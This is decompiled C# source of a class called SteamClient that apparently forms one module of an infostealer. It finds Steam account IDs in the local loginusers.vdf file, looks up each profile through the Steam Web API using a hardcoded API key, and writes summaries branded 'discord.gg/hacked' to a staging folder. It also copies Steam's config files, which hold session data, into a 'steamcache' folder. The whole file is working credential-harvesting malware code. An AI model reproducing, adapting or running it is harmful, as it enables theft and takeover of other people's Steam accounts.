using System;
using System.Collections;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;

// Token: 0x02000008 RID: 8
[global::System.Runtime.CompilerServices.NullableContext(1)]
[global::System.Runtime.CompilerServices.Nullable(0)]
public class SteamClient
{
	// Token: 0x0600000C RID: 12 RVA: 0x000021D8 File Offset: 0x000003D8
	public async Task GetSteam(string A_1)
	{
		try
		{
			Console.WriteLine("[+] Running steam");
			string steamPath = "C:\\Program Files (x86)\\Steam";
			string text = Path.Combine(steamPath, "config", "loginusers.vdf");
			if (Directory.Exists(steamPath) && File.Exists(text))
			{
				MatchCollection matchCollection = Regex.Matches(File.ReadAllText(text, Encoding.UTF8), "7656[0-9]{13}");
				foreach (object obj in matchCollection)
				{
					Match match = (Match)obj;
					string account = match.Value;
					string text2 = await this.httpClient.GetStringAsync("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=" + this.steamApiKey + "&steamids=" + account);
					string accountInfo = text2;
					text2 = await this.httpClient.GetStringAsync("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=" + this.steamApiKey + "&steamid=" + account);
					string games = text2;
					string text3 = await this.httpClient.GetStringAsync("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=" + this.steamApiKey + "&steamid=" + account);
					object obj2 = JsonConvert.DeserializeObject(accountInfo);
					object obj3 = JsonConvert.DeserializeObject(games);
					object obj4 = JsonConvert.DeserializeObject(text3);
					Console.WriteLine("Steam session detected");
					Console.WriteLine("Steam Identifier: " + account);
					Console.WriteLine("Profile URL: https://steamcommunity.com/profiles/" + account);
					string text4 = "Display Name: {0}";
					object obj5 = obj2;
					object obj6;
					if (obj5 == null)
					{
						obj6 = null;
					}
					else
					{
						if (SteamClient.<>o__2.<>p__3 == null)
						{
							SteamClient.<>o__2.<>p__3 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "personaname", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, object> target = SteamClient.<>o__2.<>p__3.Target;
						CallSite <>p__ = SteamClient.<>o__2.<>p__3;
						if (SteamClient.<>o__2.<>p__2 == null)
						{
							SteamClient.<>o__2.<>p__2 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(SteamClient), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
							}));
						}
						Func<CallSite, object, int, object> target2 = SteamClient.<>o__2.<>p__2.Target;
						CallSite <>p__2 = SteamClient.<>o__2.<>p__2;
						if (SteamClient.<>o__2.<>p__1 == null)
						{
							SteamClient.<>o__2.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.ResultIndexed, "players", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, object> target3 = SteamClient.<>o__2.<>p__1.Target;
						CallSite <>p__3 = SteamClient.<>o__2.<>p__1;
						if (SteamClient.<>o__2.<>p__0 == null)
						{
							SteamClient.<>o__2.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "response", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						obj6 = target(<>p__, target2(<>p__2, target3(<>p__3, SteamClient.<>o__2.<>p__0.Target(SteamClient.<>o__2.<>p__0, obj5)), 0));
					}
					Console.WriteLine(string.Format(text4, obj6));
					string text5 = "Time created: {0}";
					obj5 = obj2;
					object obj7;
					if (obj5 == null)
					{
						obj7 = null;
					}
					else
					{
						if (SteamClient.<>o__2.<>p__7 == null)
						{
							SteamClient.<>o__2.<>p__7 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "timecreated", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, object> target4 = SteamClient.<>o__2.<>p__7.Target;
						CallSite <>p__4 = SteamClient.<>o__2.<>p__7;
						if (SteamClient.<>o__2.<>p__6 == null)
						{
							SteamClient.<>o__2.<>p__6 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(SteamClient), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
							}));
						}
						Func<CallSite, object, int, object> target5 = SteamClient.<>o__2.<>p__6.Target;
						CallSite <>p__5 = SteamClient.<>o__2.<>p__6;
						if (SteamClient.<>o__2.<>p__5 == null)
						{
							SteamClient.<>o__2.<>p__5 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.ResultIndexed, "players", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, object> target6 = SteamClient.<>o__2.<>p__5.Target;
						CallSite <>p__6 = SteamClient.<>o__2.<>p__5;
						if (SteamClient.<>o__2.<>p__4 == null)
						{
							SteamClient.<>o__2.<>p__4 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "response", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						obj7 = target4(<>p__4, target5(<>p__5, target6(<>p__6, SteamClient.<>o__2.<>p__4.Target(SteamClient.<>o__2.<>p__4, obj5)), 0));
					}
					Console.WriteLine(string.Format(text5, obj7 ?? "Private"));
					string text6 = "Level: {0}";
					obj5 = obj4;
					object obj8;
					if (obj5 == null)
					{
						obj8 = null;
					}
					else
					{
						if (SteamClient.<>o__2.<>p__8 == null)
						{
							SteamClient.<>o__2.<>p__8 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "player_level", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						obj8 = SteamClient.<>o__2.<>p__8.Target(SteamClient.<>o__2.<>p__8, obj5);
					}
					Console.WriteLine(string.Format(text6, obj8 ?? "Private"));
					string text7 = "Game count: {0}";
					obj5 = obj3;
					object obj9;
					if (obj5 == null)
					{
						obj9 = null;
					}
					else
					{
						if (SteamClient.<>o__2.<>p__9 == null)
						{
							SteamClient.<>o__2.<>p__9 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "game_count", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						obj9 = SteamClient.<>o__2.<>p__9.Target(SteamClient.<>o__2.<>p__9, obj5);
					}
					Console.WriteLine(string.Format(text7, obj9 ?? "Private"));
					if (!Directory.Exists(Path.Combine(A_1, "Steam Accounts")))
					{
						Directory.CreateDirectory(Path.Combine(A_1, "Steam Accounts"));
						Directory.CreateDirectory(Path.Combine(A_1, "Steam Accounts", "steamcache"));
					}
					string text8 = Path.Combine(A_1, "Steam Accounts", account + ".txt");
					string text9 = "<================[ Steam Account: ";
					string text10 = account;
					string text11 = " ]>================>\ndiscord.gg/hacked\n\n";
					string text12 = "Steam Identifier: {0}\nDisplay Name: {1}\nTime created: {2}\nLevel: {3}\nGame count: {4}\nProfile URL: https://steamcommunity.com/profiles/{5}";
					object[] array = new object[6];
					array[0] = account;
					int num = 1;
					obj5 = obj2;
					object obj10;
					if (obj5 == null)
					{
						obj10 = null;
					}
					else
					{
						if (SteamClient.<>o__2.<>p__13 == null)
						{
							SteamClient.<>o__2.<>p__13 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "personaname", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, object> target7 = SteamClient.<>o__2.<>p__13.Target;
						CallSite <>p__7 = SteamClient.<>o__2.<>p__13;
						if (SteamClient.<>o__2.<>p__12 == null)
						{
							SteamClient.<>o__2.<>p__12 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(SteamClient), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
							}));
						}
						Func<CallSite, object, int, object> target8 = SteamClient.<>o__2.<>p__12.Target;
						CallSite <>p__8 = SteamClient.<>o__2.<>p__12;
						if (SteamClient.<>o__2.<>p__11 == null)
						{
							SteamClient.<>o__2.<>p__11 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.ResultIndexed, "players", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, object> target9 = SteamClient.<>o__2.<>p__11.Target;
						CallSite <>p__9 = SteamClient.<>o__2.<>p__11;
						if (SteamClient.<>o__2.<>p__10 == null)
						{
							SteamClient.<>o__2.<>p__10 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "response", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						obj10 = target7(<>p__7, target8(<>p__8, target9(<>p__9, SteamClient.<>o__2.<>p__10.Target(SteamClient.<>o__2.<>p__10, obj5)), 0));
					}
					array[num] = obj10;
					int num2 = 2;
					obj5 = obj2;
					object obj11;
					if (obj5 == null)
					{
						obj11 = null;
					}
					else
					{
						if (SteamClient.<>o__2.<>p__17 == null)
						{
							SteamClient.<>o__2.<>p__17 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "timecreated", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, object> target10 = SteamClient.<>o__2.<>p__17.Target;
						CallSite <>p__10 = SteamClient.<>o__2.<>p__17;
						if (SteamClient.<>o__2.<>p__16 == null)
						{
							SteamClient.<>o__2.<>p__16 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(SteamClient), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
							}));
						}
						Func<CallSite, object, int, object> target11 = SteamClient.<>o__2.<>p__16.Target;
						CallSite <>p__11 = SteamClient.<>o__2.<>p__16;
						if (SteamClient.<>o__2.<>p__15 == null)
						{
							SteamClient.<>o__2.<>p__15 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.ResultIndexed, "players", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, object> target12 = SteamClient.<>o__2.<>p__15.Target;
						CallSite <>p__12 = SteamClient.<>o__2.<>p__15;
						if (SteamClient.<>o__2.<>p__14 == null)
						{
							SteamClient.<>o__2.<>p__14 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "response", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						obj11 = target10(<>p__10, target11(<>p__11, target12(<>p__12, SteamClient.<>o__2.<>p__14.Target(SteamClient.<>o__2.<>p__14, obj5)), 0));
					}
					array[num2] = obj11 ?? "Private";
					int num3 = 3;
					obj5 = obj4;
					object obj12;
					if (obj5 == null)
					{
						obj12 = null;
					}
					else
					{
						if (SteamClient.<>o__2.<>p__18 == null)
						{
							SteamClient.<>o__2.<>p__18 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "player_level", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						obj12 = SteamClient.<>o__2.<>p__18.Target(SteamClient.<>o__2.<>p__18, obj5);
					}
					array[num3] = obj12 ?? "Private";
					int num4 = 4;
					obj5 = obj3;
					object obj13;
					if (obj5 == null)
					{
						obj13 = null;
					}
					else
					{
						if (SteamClient.<>o__2.<>p__19 == null)
						{
							SteamClient.<>o__2.<>p__19 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "game_count", typeof(SteamClient), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						obj13 = SteamClient.<>o__2.<>p__19.Target(SteamClient.<>o__2.<>p__19, obj5);
					}
					array[num4] = obj13 ?? "Private";
					array[5] = account;
					File.WriteAllText(text8, text9 + text10 + text11 + string.Format(text12, array));
					foreach (string text13 in Directory.GetFiles(Path.Combine(steamPath, "config")))
					{
						string fileName = Path.GetFileName(text13);
						if (!new string[] { "avatarcache", "gamepad", "lighthouse" }.Contains(fileName))
						{
							File.Copy(text13, Path.Combine(A_1, "Steam Accounts", "steamcache", fileName));
						}
					}
					account = null;
					accountInfo = null;
					games = null;
				}
				IEnumerator enumerator = null;
			}
			steamPath = null;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex);
		}
	}

	// Token: 0x04000005 RID: 5
	private readonly HttpClient httpClient = new HttpClient();

	// Token: 0x04000006 RID: 6
	private readonly string steamApiKey = "440D7F4D810EF9298D25EDDF37C1F902";
}
